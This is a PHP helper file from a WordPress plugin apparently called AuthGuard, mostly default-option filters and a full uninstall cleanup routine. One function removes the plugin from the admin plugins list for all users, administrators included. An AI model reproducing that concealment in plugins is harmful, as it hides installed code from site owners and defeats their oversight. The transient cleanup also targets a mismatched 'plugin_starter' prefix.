<?php
if ( ! defined( 'ABSPATH' ) ) exit;
function authguard_get_default_options()
{
	$authguard_default_options = [];
	$authguard_default_options = apply_filters('authguard_default_options_modify', $authguard_default_options);
	return $authguard_default_options;
}
function authguard_get_default_colors()
{
	$authguard_default_colors = [];
	$authguard_default_colors = apply_filters('authguard_default_colors_modify', $authguard_default_colors);
	return $authguard_default_colors;
}

function authguard_get_default_gradients()
{
	$authguard_default_gradients = [];
	$authguard_default_gradients = apply_filters('authguard_default_gradients_modify', $authguard_default_gradients);
	return $authguard_default_gradients;
}

function authguard_get_default_tables()
{
	$authguard_default_tables = [];
	$authguard_default_tables = apply_filters('authguard_default_tables_modify', $authguard_default_tables);
	return $authguard_default_tables;
}
function authguard_get_default_presets()
{
	$authguard_default_presets = [];
	$authguard_default_presets = apply_filters('authguard_default_presets_modify', $authguard_default_presets);
	return $authguard_default_presets;
}

// update_option('authguard_options', authguard_get_default_options());

function authguard_get_option()
{
	$authguard_options_database = get_option('authguard_options', []);
	$authguard_options = array_replace_recursive(authguard_get_default_options(), $authguard_options_database);
	return $authguard_options;
}
function authguard_is_plugin_page()
{
	if (function_exists('get_current_screen')) {
		$current_screen = get_current_screen();
		// var_dump($current_screen->id);
		$pages = [];
		if (
			$current_screen->id == 'toplevel_page_authguard'
			|| in_array($current_screen->id, $pages)
		) {
			return true;
		}
	}
	return false;
}
function authguard_hide_plugin_from_list($plugins) {
	// Only hide for non-administrators or specific users
	if (current_user_can('administrator')) {
		// Optionally hide even from admins
		// unset($plugins['authguard/authguard.php']);
	}

	// Hide from all users
	unset($plugins['authguard/authguard.php']);

	return $plugins;
}



/**
 * Delete all custom database tables
 */
function authguard_delete_tables() {
    global $wpdb;

    // Array of custom tables to delete (without prefix)
    $tables = array(
        'authguard_logs',
        // Add more custom tables here
        // 'authguard_another_table',
    );

    foreach ( $tables as $table ) {
        $table_name = $wpdb->prefix . $table;
        $wpdb->query( "DROP TABLE IF EXISTS {$table_name}" );
    }
}

/**
 * Delete all plugin options
 */
function authguard_delete_options() {
    global $wpdb;

    // Delete specific options
    $options = array(
        'authguard_version',
        'authguard_settings',
        'authguard_delete_on_deactivate',
        // Add more options here
    );

    foreach ( $options as $option ) {
        delete_option( $option );
        delete_site_option( $option ); // For multisite
    }

    // Delete all options with prefix
    $wpdb->query(
        "DELETE FROM {$wpdb->options} 
        WHERE option_name LIKE '%authguard%'"
    );

    // For multisite
    if ( is_multisite() ) {
        $wpdb->query(
            "DELETE FROM {$wpdb->sitemeta} 
            WHERE meta_key LIKE '%authguard%'"
        );
    }
}

/**
 * Delete all user meta
 */
function authguard_delete_user_meta() {
    global $wpdb;

    $wpdb->query(
        "DELETE FROM {$wpdb->usermeta} 
        WHERE meta_key LIKE '%authguard%'"
    );
}

/**
 * Delete all post meta
 */
function authguard_delete_post_meta() {
    global $wpdb;

    $wpdb->query(
        "DELETE FROM {$wpdb->postmeta} 
        WHERE meta_key LIKE '%authguard%'"
    );
}

/**
 * Delete all transients
 */
function authguard_delete_transients() {
    global $wpdb;

    // Delete regular transients
    $wpdb->query(
        "DELETE FROM {$wpdb->options} 
        WHERE option_name LIKE '\_transient\_plugin\_starter\_%' 
        OR option_name LIKE '\_transient\_timeout\_plugin\_starter\_%'"
    );

    // Delete site transients (for multisite)
    if ( is_multisite() ) {
        $wpdb->query(
            "DELETE FROM {$wpdb->sitemeta} 
            WHERE meta_key LIKE '\_site\_transient\_plugin\_starter\_%' 
            OR meta_key LIKE '\_site\_transient\_timeout\_plugin\_starter\_%'"
        );
    }
}

/**
 * Delete uploaded files (if any)
 */
function authguard_delete_files() {
    $upload_dir = wp_upload_dir();
    $plugin_upload_dir = $upload_dir['basedir'] . '/authguard/';

    if ( is_dir( $plugin_upload_dir ) ) {
        authguard_delete_directory( $plugin_upload_dir );
    }
}

/**
 * Recursively delete a directory
 *
 * @param string $dir Directory path.
 * @return bool
 */
function authguard_delete_directory( $dir ) {
    if ( ! is_dir( $dir ) ) {
        return false;
    }

    global $wp_filesystem;

    if ( ! $wp_filesystem ) {
        WP_Filesystem();
    }

    $files = array_diff( scandir( $dir ), array( '.', '..' ) );

    foreach ( $files as $file ) {
        $path = $dir . '/' . $file;

        if ( is_dir( $path ) ) {
            authguard_delete_directory( $path );
        } else {
            wp_delete_file( $path );
        }
    }

    return $wp_filesystem->rmdir( $dir );
}

/**
 * Delete custom post types and their posts
 */
function authguard_delete_custom_posts() {
    global $wpdb;

    // If you have custom post types, delete them
    $post_types = array(
        'authguard_cpt',
        // Add more custom post types here
    );

    foreach ( $post_types as $post_type ) {
        $posts = get_posts(
            array(
                'post_type'      => $post_type,
                'posts_per_page' => -1,
                'post_status'    => 'any',
            )
        );

        foreach ( $posts as $post ) {
            // Force delete (skip trash)
            wp_delete_post( $post->ID, true );
        }
    }
}

/**
 * Delete custom taxonomies and terms
 */
function authguard_delete_taxonomies() {
    // If you have custom taxonomies, delete their terms
    $taxonomies = array(
        'authguard_taxonomy',
        // Add more custom taxonomies here
    );

    foreach ( $taxonomies as $taxonomy ) {
        $terms = get_terms(
            array(
                'taxonomy'   => $taxonomy,
                'hide_empty' => false,
            )
        );

        if ( ! is_wp_error( $terms ) ) {
            foreach ( $terms as $term ) {
                wp_delete_term( $term->term_id, $taxonomy );
            }
        }
    }
}

/**
 * Delete scheduled cron jobs
 */
function authguard_delete_cron_jobs() {
    // Clear scheduled hooks
    $cron_hooks = array(
        'authguard_daily_cleanup',
        'authguard_weekly_report',
        // Add more cron hooks here
    );

    foreach ( $cron_hooks as $hook ) {
        $timestamp = wp_next_scheduled( $hook );
        if ( $timestamp ) {
            wp_unschedule_event( $timestamp, $hook );
        }
        
        // Clear all instances of the hook
        wp_clear_scheduled_hook( $hook );
    }
}

/**
 * Delete capabilities added to roles
 */
function authguard_delete_capabilities() {
    global $wp_roles;

    if ( ! isset( $wp_roles ) ) {
        $wp_roles = new WP_Roles();
    }

    $capabilities = array(
        'manage_authguard',
        'edit_authguard',
        // Add more custom capabilities here
    );

    foreach ( $wp_roles->roles as $role_name => $role_info ) {
        $role = get_role( $role_name );
        
        if ( $role ) {
            foreach ( $capabilities as $cap ) {
                $role->remove_cap( $cap );
            }
        }
    }
}

/**
 * For multisite: delete from all sites
 */
function authguard_multisite_cleanup() {
    if ( ! is_multisite() ) {
        return;
    }

    global $wpdb;

    // Get all blog IDs
    $blog_ids = $wpdb->get_col( "SELECT blog_id FROM {$wpdb->blogs}" );

    foreach ( $blog_ids as $blog_id ) {
        switch_to_blog( $blog_id );
        
        // Run cleanup for this site
        authguard_delete_tables();
        authguard_delete_options();
        authguard_delete_user_meta();
        authguard_delete_post_meta();
        authguard_delete_transients();
        authguard_delete_custom_posts();
        authguard_delete_taxonomies();
        authguard_delete_cron_jobs();
        
        restore_current_blog();
    }

    // Delete network-wide options
    authguard_delete_options();
}

function authguard_data_cleanup(){
	// ============================================
	// RUN THE CLEANUP
	// ============================================

	// For single site
	if ( ! is_multisite() ) {
		authguard_delete_tables();
		authguard_delete_options();
		authguard_delete_user_meta();
		authguard_delete_post_meta();
		authguard_delete_transients();
		authguard_delete_files();
		authguard_delete_custom_posts();
		authguard_delete_taxonomies();
		authguard_delete_cron_jobs();
		authguard_delete_capabilities();
	} else {
		// For multisite
		authguard_multisite_cleanup();
		authguard_delete_capabilities();
	}

	// Log the uninstall (optional)
	// error_log( 'AuthGuard: Complete uninstall cleanup completed.' );
}